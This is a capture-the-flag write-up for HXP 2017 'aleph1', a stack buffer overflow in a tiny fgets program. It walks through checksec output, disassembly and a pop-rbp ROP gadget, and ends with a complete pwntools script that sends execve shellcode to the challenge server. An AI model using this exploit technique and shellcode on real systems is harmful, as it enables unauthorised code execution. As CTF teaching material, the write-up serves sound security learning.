
# HXP 2017 - aleph1


So for this challenge we were provided with source code. 

```cpp
int main()
{
    char yolo[0x400];
    fgets(yolo, 0x539, stdin);
}
```


This seems like a classic buffer overflow. Further inspection of the binary shows that NX bit is disabled. Useless fact: 0x539 == 1337.

	Arch:     amd64-64-little
	RELRO:    Partial RELRO
	Stack:    No canary found
	NX:       NX disabled
	PIE:      No PIE (0x400000)
	RWX:      Has RWX segments

The disassembly of main():

    0x4005ca <main>       push   rbp                           <0x400600>
  	0x4005cb <main+1>     mov    rbp, rsp
  	0x4005ce <main+4>     sub    rsp, 0x400
  	0x4005d5 <main+11>    mov    rdx, qword ptr [rip + 0x200a54] <0x601030>
   	0x4005dc <main+18>    lea    rax, [rbp - 0x400]
   	0x4005e3 <main+25>    mov    esi, 0x539
   	0x4005e8 <main+30>    mov    rdi, rax
   	0x4005eb <main+33>    call   fgets@plt                     <0x4004d0>
   	0x4005f0 <main+38>    mov    eax, 0
   	0x4005f5 <main+43>    leave
   	0x4005f6 <main+44>    ret

We see that ```rbp``` is used to determine the address of the buffer to be written to at 0x4005dc. So lets search for gadgets that modifies ```rbp```!

	0x0000000000400538: pop rbp; ret;
    
Perfect, there is one at 0x400538. So now we can control ```rbp```, hence controlling where our shellcode is written to. After that, we can ROP to our shellcode.

Our flow:
```
1. ROP to our gadget.
2. Pop address of our choice into RBP.
3. Return back to main+11.
4. Write shellcode to address of our choice.
5. Return to our shellcode.
6. cat flag.txt
```

Final script:
```python
from pwn import *

r = remote('35.205.206.137', 1996)
shellcode = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"

payload = 'A' * 1032
payload += p64(0x400538)
payload += p64(0x6010a0 + 0x400)
payload += p64(0x4005d5)

r.sendline(payload)

payload = shellcode
payload += '\x90' * (0x400 - len(payload))
payload += p64(0x6010a0 + 0x400)  # leave
payload += p64(0x6010a0) # ret

r.sendline(payload)
r.interactive()
```


	
